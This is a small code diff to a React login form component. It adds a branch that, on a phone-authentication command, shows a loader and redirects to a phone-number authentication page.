@@ -61,6 +61,13 @@ export default function LoginForm({ setNavigation, navigation }) {
                 // setIsLoading(false);
                 router.push('/AuthenticationPage');
             }, 1500);
+        } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
+            setIsLoading(false);
+            setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                router.push('/NumAuthenticationPage');
+            }, 1500);
         }
     }, [command]);
 
